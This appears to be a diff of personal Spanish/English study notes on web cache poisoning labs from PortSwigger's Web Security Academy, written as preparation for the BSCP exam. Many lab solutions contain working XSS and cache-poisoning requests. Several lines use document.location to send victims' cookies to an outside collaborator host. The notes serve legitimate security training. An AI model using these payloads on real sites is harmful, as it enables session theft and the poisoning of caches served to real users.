@@ -1,7 +1,302 @@
 Burp Scan Is gotty : )
+## IMPORTANTE: 
+
+**Cuando encuentre en un lab o en el BSCP una APP que no devuelve /admin, no tiene scripts curiosos que podamos explotar, no tiene una funcionalidad que podamos analizar para explotar, el brute force attack del LOGIN por el rate limit tampoco funciona, tampoco podemos ingresar como wiener y tras de eso el FFUF no encuentra enpoints ocultos, el ataque va directamente en modificiar algo de la request principal de la app, su host header, un nuevo param body, un web cache (si devuelve reglas de caché, etc)**
+
+> Para estos laboratorios el enfoque importante es poder mantenernos analizando los scripts que se carguen en la APP a un recurso JS, por ahi podremos analizar. 
+## Param Miner: para poder encontrar web cache vulnerabilities.  
+
+* Dentro de burp repeater con el endpoint Home page / tiramos un ataque con la extensión param_miner le damos a > Guess Query params y esperamos el resultado, podemos probar otros enpoints tambien. 
 
 ParamMiner (Guess Header):
 ![[Pasted image 20260726124451.png]]
+
+---
+
+### LAB: Web cache poisoning with an unkeyed header
+
+* This labs support the `X-Forwarded-Host` Header. 
+![[Pasted image 20260810212912.png]]
+
+Vemos que el home page carga un script para la pagina principal localizado en `/resources/js/tracking.js` ese endpoint es el que podemos tomar modificar añadirselo a nuestro server exploit y dejar nuestra carga maliciosa en nuestro exploit, pero es clave identificar que la url que carga el recurso de JS es una url relativa y es la misma url del lab, entonces con un X-Forwarded-Host podemos intentar aplicarlo y añadir nuestro server-exploit.net:
+
+* `X-Forwarded-Host: EXPLOIT.net`
+* `X-Host: EXPLOIT.net`
+
+![[Pasted image 20260810212918.png]]
+
+En el server exploit dejamos el endpoint tal cual como el recurso legitimo del lab `/resources/js/tracking.js` con el contenido de un `alert(document.cookie)` →
+
+![[Pasted image 20260810212923.png]]
+#### Para el proposito del BSCP, en server exploit podemos guardar realmente: 
+
+```js
+document.location='https://OASTIFY.COM/?cookies='+document.cookie;
+```
+
+Y lo guardamos y cuando tenemos la `request` vemos que se carga exitosamente. 
+
+![[Pasted image 20260810212929.png]]
+### LAB: Web cache poisoning with an unkeyed cookie XSS
+
+* `Cookie: session=VALUE; NameWeirdCookie=value`
+* Se ve reflejada el valor de la NameWeirdCookie en un `Data = {"host""...", "frontend":"ValueOfWeirdCookie"}`
+![[Pasted image 20260810212935.png]]
+
+```js
+NameWeirdCookie=test"-alert(1)-"test
+fehost=someString"-alert(1)-"someString //LAB ORIGINAL.
+```
+
+### LAB: Multiples Headers poison cache  `cookie stole`
+
+> Este laboratorio se vulnera cuando enviamos la petición y el caché la almacena, en nuestro server exploit dejamos **el endpoint como /resources/js/tracking.js** debido a que el home legitimo de la aplicación contiene un script que se procesa en el home siempre que se recarga el cual es el endpoint vulnerable que podemos usar para hacernos pasar por ese endpoint en el server exploit y poner el alert(document.cookie) ahora bien, entonces mandamos la request de arriba tantas veces hasta que envenemos la caché y entonces cuando el usuario vaya a abrir la pagina de inicio automaticamente por debajo cargará el script /resources/js/tracking.js que en realidad se carga desde el dominio del server exploit que contiene el alert(document.cookie) y así es como producimos el envenenamiento y ataque exitoso.
+
+* Con param miner podemos encontrar esta vulnerabilidad, igual que burp scanner. 
+
+![[Pasted image 20260810212942.png]]
+
+* En el server exploit dejamos el `document.location`  pa robarnos la triple mega carechimba cookie. 
+
+```js
+GET /resources/js/tracking.js?cb=123 HTTP/2
+Host: TARGET.net
+X-Forwarded-Host: EXPLOIT.net
+X-Forwarded-Scheme: nothttps
+
+//Y EN EL SERVER EXPLOIT:
+document.location='https://OASTIFY.COM/?poisoncache='+document.cookie;
+
+//CLARO PARA LA SOLUCION DEL LAB ES ->
+alert(document.cookie);
+```
+
+Remove the `cb=123` cache **buster**, and then poison the cache until the victim is redirected to the exploit server payload tracking.js to steal session cookie.
+
+### LAB: Web cache poisoning using an unknown header
+
+El endpoint de post nos demuestra desde param miner el parametro header que adivinó fue `x-host`
+
+![[Pasted image 20260810212949.png]]
+
+Desde el endpoint home / que es el que carga el /resources/js/tracking.js se encontró el header x-host seguramente por ahí podremos pasarle nuestro dominio de server exploit, creamos un caché buster en el endpoint y luego dejamos el resources tracking.js
+
+XSS **post coment** to retrieve the user agent
+
+```js
+<img src="exploit-server">
+
+// ------- EN EL EXPLOIT SERVER --------
+//with a payload of alert(document.cookie) on the exploit server
+```
+
+Al server exploit nos llega el user agent de la victima, lo tomamos y lo dejamos en la request raiz `GET / HTTP/1.1`
+
+```js
+...
+X-Host: exploit-ID-EXPLOIT.exploit-server.net
+Connection: close
+User-Agent: ...victim User Agent...
+
+//Envenamos la request y la enviamos hasta que podamos ver que el lab se pasa a solved eso significa que el user victima ingreso al home y le retornó el alert, ahora bien para probarlo dejar un show response in browser de la respuesta con la caché en hit con una edad temprana y esa respuesta en el navegador constantemente recargarla al tiempo que debemos tirar la request desde repeater hasta que nos de en solved.
+```
+
+### LAB: Web cache poisoning via an unkeyed query string `XSS`
+
+* Solucion rapida: 
+	*  Use Origin: header as a cache buster query /?evil=test gets reflected on the output add payload
+		```GET /?evil='/><script>alert(1)</script>```
+
+* Solucion conceptual paso a paso: 
+
+Necesitamos usar algunos headers de sondeo como caches busters para no afectar la pagina principal de los usuarios, algunos que se pueden utilizar son:
+
+```jsx
+Accept-Encoding: gzip, deflate, cachebuster
+Accept: */*, text/cachebuster
+Cookie: cachebuster=1
+Origin: <https://cachebuster.vulnerable-website.com>
+```
+
+Intentandolo con las tres primeras:
+
+```jsx
+Accept-Encoding: gzip, deflate, cachebuster
+Accept: */*, text/cachebuster
+Cookie: cachebuster=1
+```
+
+No veia resultados en la caché, la caché tiraba hit por lo cual no se reiniciaba el caché,
+
+![[Pasted image 20260810213003.png]]
+
+Sin embargo cuando tiré de `origin` automaticamente se cambiaba `X-Cache: miss` con `Age: 0` con lo cual ya con eso basta, modificar el origin una vez mas para confirmar el header de cachebuster y ahora si, seguimos intentando inyectar nuestro XSS en el query param, ahora bien
+
+#### ¿Por qué es necesario la caché buster?
+
+Basicamente porque nos permite sondear nuestro envenenamiento de cache sin afectar la pagina en tiempo real y a los usuarios reales, y además que para efectos de pruebas si tenemos la cache buster cada que queramos probar la carga util XSS que queremos intentar probar no tendremos que esperar todo el `max-age` a que llegue al final sino que realmente con modificar algun caracter del header cachebuster automaticamente se reseteará la caché en `X-Cache: miss`
+
+```jsx
+?key=jsjsjs'/><script>alert(1)</script> --PAYLOAD EXITOSO
+```
+
+Sin embargo analicemos el contexto JS:
+
+```jsx
+<link rel="canonical" 
+href='//ID-LAB.web-security-academy.net
+/?dddd=jsjsjsjs'/>
+```
+
+¿Como hacemos pa’ salirnos del contexto de la tag link y ejecutar XSS codigo JS?
+
+En este caso es cuando debemos intentar pensar fuera de la caja, utilizar caracteres para cerrar la tag link y añadir la carga util.
+
+```jsx
+<link rel="canonical" 
+href='//ID-LAB.web-security-academy.net
+/?test=value'/><script>alert(1)</script>'/>
+
+* /?test=value'/><script>alert(1)</script>/>
+```
+
+Y así es como lo podemos ver reflejado.
+
+### LAB: Web cache poisoning via an unkeyed parameter `utm_content` `cookie` `canonical`
+
+Con burp scann podemos tirar al directorio raiz y nos puede devolver un web cache poisoning, y con param miner>guess query params
+
+![[Pasted image 20260810213011.png]]
+
+1. Dentro de burp repeater con el endpoint Home page / tiramos un ataque con la extensión param_miner le damos a > Guess Query params y esperamos el resultado, en este caso se encontró el query param: utm_content:
+
+![[Pasted image 20260810213016.png]]
+
+* Tiramos el payload XSS para robar la cookie:
+
+```js
+//PAYLOADS PARA EL BSCP. 
+GET /?utm_content='/><script>document.location="https://OASTIFY.COM?c="+document.cookie</script>
+
+//Si el response no procesa el simbolo `+` lo codeamos a url: 
+GET /?utm_content='/><script>document.location="https://OASTIFY.COM?c="%2bdocument.cookie</script>
+
+
+//CACHE BUSTER:
+GET /?pccgfs7bx6=1&utm_content='/><script>document.location="https://oastify.com?c="%2bdocument.cookie</script>
+
+//SOLUCION PARA EL LAB, SIMPLEMENTE UN ALERT
+GET /?utm_content='/><script>alert(1)</script> HTTP/2
+```
+
+Y a nuestro COLLAB nos llega: 
+
+![[Pasted image 20260810213020.png]]
+
+### LAB: Web Caché Poisoning Parameter cloaking `callback` `cookie` `setCountryCookie`
+
+* Tirar un param miner para guess query params > que será el que nos retorne el `utm_content` y además también dara paso a poder burp scanner retornar vuln critica si la toma. 
+
+> Y bajo la regla del framework ruby on rails un parametro que esté repetido será tomado en cuenta el parametro final de esos params repetidos, en este caso este callback con la alert function. /?exampletest=23&user=carlos&exampletest=;alert(1) el segundo exampletest será el tomado en cuenta, entiendes lo que te digo?
+#### Research que válida el parameter cloaking:
+
+1. [https://portswigger.net/research/web-cache-entanglement](https://portswigger.net/research/web-cache-entanglement) → James Keetle.
+
+> The `callback` parameter is keyed, and thus cannot poison cache for victim user, but by combine duplicate parameter with `utm_content` it then excluded and cache can be poisoned.
+
+```
+GET /js/geolocate.js?callback=setCountryCookie&utm_content=fuzzer;callback=EVILFunction
+```
+
+![[Pasted image 20260810213027.png]]
+
+> Cache Cloaking Cookie Capturing payload below, keep poising cache until victim hits stored cache.
+
+```js
+GET /js/geolocate.js?callback=setCountryCookie&utm_content=fuzzer;callback=document.location='https://OASTIFY.COM?nuts='%2bdocument.cookie%3b HTTP/2
+```
+
+> Below is [Url Decoded](https://www.urldecoder.org/) payload. -> for the BSCP EXAM.
+
+```js
+GET/js/geolocate.js?callback=setCountryCookie&utm_content=felipeProof;callback=document.location='https://OASTIFY.COM?nuts='+document.cookie; HTTP/2
+```
+
+### LAB: Web cache poisoning via a fat GET request
+
+Sencillamente tomaré el endpoint del callback y lo ajustaré para añadir una request GET Fat, y así el server caché interpretará el callback=setCountryCookie sin embargo el backend server interpretará el param body con callback=alert(1) ->
+
+![[Pasted image 20260810213032.png]]
+
+```js
+GET /js/geolocate.js=callback=setCountryCookie HTTP/2
+Host: ...
+Acept-Languaje: ...
+Content-Length: 24...
+
+callback=alert(1)
+```
+
+
+### LAB: Web Cache Poisoning URL normalization `XSS` Poor `URL-encoding`
+
+> El truco estaba en envenenar correctamente desde burp repeater y casi que al instante enviar esta url a la victima.
+> El secreto enviar desde burp repeater la carga util para poder de que se mantuviera sin codificar a url y cargara el script, que luego almacenado en cache durante ese lapso de 10seg se lo podiamos enviar a la victima y le cargaría el payload.
+
+Payload: 
+
+```ruby
+"con este funcionó aunque hubiera funcionado con los demás tambien."
+https://ID-LAB.web-security-academy.net/random<script>alert(1)</script>foo
+
+GET /random<script>alert(1)</script>foo HTTP/2
+Host: ID-LAB.web-security-academy.net
+etc ...
+..
+```
+
+### LAB: Host Header Web Cache Poisoning Vía Ambiguous Request  `Cookie Stole`
+
+```js
+//Modificar el HOST, añadiendo un cache buster de test. 
+GET /?cb=jsjsj HTTP/1.1
+Host: web-security-academy.net
+Host: Exploit-Server.net
+
+//En exploit server -> store & deliver exploit to victim
+document.location='https://OASTIFY.COM/?CacheCookies='+document.cookie;
+
+//Actualizar el request al home. 
+```
+
+![[Pasted image 20260810213040.png]]
+
+### Lab: Web cache poisoning to exploit a DOM vulnerability via a cache with strict cacheability criteria `Free shipping to United Kingdom` `Host Header Injection`
+
+> Host **X-Forwarded-Host Injection** > Param Miner > Guess Host Headers...
+
+1. Usemos Param miner > Para encontrar Headers > `X-Forwarded-Host` Y le damos el valor de `evil.com` Por ejm.
+2. Y se sobrescribe el valor de la variable **data**
+	1. ![[Pasted image 20260810213049.png]]
+	2. ![[Pasted image 20260810213054.png]]
+3. Luego vemos que si, por debajo lo que hace es llamar a la funcion geolocate.js que carga un JSON de {country:”…”} aqui viene lo vital ya que el JSON lo carga pero desde ese [data.host](http://data.host/) que es precisamente el que nosotros podemos modificar, y en este caso lo modificamos por el host exploit server.→
+	1. ![[Pasted image 20260810213058.png]]
+4. En exploit server, actualizamos la ruta: `/resources/json/geolocate.json`
+5. Dejemosle en el `exploit server`, la politica de cors para que quede habilitada:
+    - `Access-Control-Allow-Origin: *`
+6. En el server-exploit dejemosle el payload:
+```json
+{ 
+	"country": "<img src=1 onerror=alert(document.cookie) />" 
+}
+```
+
+7. Enviamos la petición hasta que veamos que la url de nuestro exploit server se ve reflejado en la variable data host y la caché está del tipo `X-Cache: hit`
+8. Hacemos un show response in browser pa' ver el alert, a ver si se da. 
+![[Pasted image 20260810213104.png]]
+9. Si nos da, tenemos que seguir enviando la request manteniendo el cache en `hit` para que el usuario visite la página principal y se active la carga útil XSS, y el lab se resuelva, como en la img de arriba. 
+
+---
 
 3. 
 ![[Pasted image 20260726125343.png]]
@@ -29,7 +324,6 @@ ParamMiner (Guess Header):
 
 
 Checklist:
-```
 Poison to leak cookie:
 document.location='https://<exploit-server>?cookie='+document.cookie;
 
@@ -46,119 +340,6 @@ document.location='https://<exploit-server>?cookie='+document.cookie;
 	2. Try using an unkeyed param such as: setCountryCode=idkbro&utm_content=foo;setCountryCode=alert(1)
 9. XSS vulnerability that is not directly exploitable due to browser URL-encoding. Take advantage of the cache's normalization process to exploit this vulnerability -> GET /random</p><script>alert(1)</script><p>foo
 	1. Copy URL when cache hits, send to victim
-```
-##### With unkeyed header
-```
-Add a cache-buster query parameter, such as ?cb=1234.
-Add the X-Forwarded-Host header with an arbitrary hostname, such as example.com, and send the request.
-Observe that the X-Forwarded-Host header has been used to dynamically generate an absolute URL for importing a JavaScript file stored at /resources/js/tracking.js.
-
-Replay the request and observe that the response contains the header X-Cache: hit. This tells us that the response came from the cache.
-
-Go to the exploit server and change the file name to match the path used by the vulnerable response:
-/resources/js/tracking.js
-
-In the body, enter the payload alert(document.cookie) and store the exploit.
-Open the GET request for the home page in Burp Repeater and remove the cache buster.
-
-Add the following header, remembering to enter your own exploit server ID:
-X-Forwarded-Host: YOUR-EXPLOIT-SERVER-ID.exploit-server.net
-Send your malicious request. Keep replaying the request until you see your exploit server URL being reflected in the response and X-Cache: hit in the headers.
-```
-
-##### Unkeyed cookie
-A cookie is being reflected content on javascript and hiting cache.
-```
-fehost=someString"-alert(1)-"someString
-```
 
 
-##### Multi Header Poisoning cache header
-```
-GET /resources/js/tracking.js
-...
-X-Forwarded-Host: exploit-0a49001804f8a59482f069e8010b0050.exploit-server.net
-X-Forwarded-Scheme: nothttps
 
-
-Response:
-HTTP/2 302 Found
-Location: https://exploit-0a49001804f8a59482f069e8010b0050.exploit-server.net/resources/js/tracking.js
-X-Frame-Options: SAMEORIGIN
-Cache-Control: max-age=30
-Age: 1
-X-Cache: hit
-Content-Length: 0
-
-
-RIGHT CLICK COPY URL TO TEST PAYLOAD with ?cb=12345
-
-SPAM SEND TILL POISONED withuth buster , RELOAD HOME PAGE TO TEST
-```
-
-
-##### X-Host but with user agent vary
-Using the parameter miner extension we find the x-host header
-```
-X-Host: malware.com
-Connection: close
-...
-...
-Vary: User-Agent
-X-Frame-Options: SAMEORIGIN
-Cache-Control: max-age=30
-...
-   <body>
-        <script type="text/javascript" src="//malware.com/resources/js/tracking.js"></script>
-        <script src="/resources/labheader/js/labHeader.js"></script>
-```
-
-XSS post coment to retrieve the user agent
-```
-<img src="exploit server">
-```
-```
-...
-X-Host: exploit-0ad9008c03e4756580a348aa019600fd.exploit-server.net
-Connection: close
-```
-with a payload of alert(document.cookie) on the exploit server
-
-##### Unkeyed query string
-Use Origin: header as a cache buster
-query /?evil=test gets reflected on the output
-add payload
-```
-GET /?evil='/><script>alert(1)</script>
-```
-Remove query string to simulate victim, but still with cache buster, remove cache buster and add payload again till cache hits
-
-#### unkeyed parameter
-```
-Observe that the home page is a suitable cache oracle. Notice that you get a cache miss whenever you change the query string. This indicates that it is part of the cache key. Also notice that the query string is reflected in the response.
-
-using Param Miner extension we find that utm_content is supported
-
-We confirm that the parameter is unkeyed by adding it to the query string and checking that we still get a cache hit
-
-use a cache buster in the query such as &test=xyz along with the payload ?utm_content='/><script>alert(1)</script>
-
-Remove payload copy URL and confirm that the alrt works, remove cache buster and add payload till hits to solve.
-
-```
-
-##### Parameter cloaking
-```
-Potential XSS on setCountryCode parameter, but we cannot cache it because its keyed. (adding 'aaa' will result in a miss cache)
-Try polluting with duplicated parameter but doesnt work.
-
-Find utm_content is not keyed
-setCountryCode=idkbro&utm_content=foo;setCountryCode=alert(1)
-
-This polutes cache, as we still get a hit when adding aaas to the final of the string
-```
-
-##### Web cache poisoning via a fat GET request
-callback function can be modify and hit cache if duplicated parameter in the body
-![[Pasted image 20240128175036.png]]
-Reload Home page
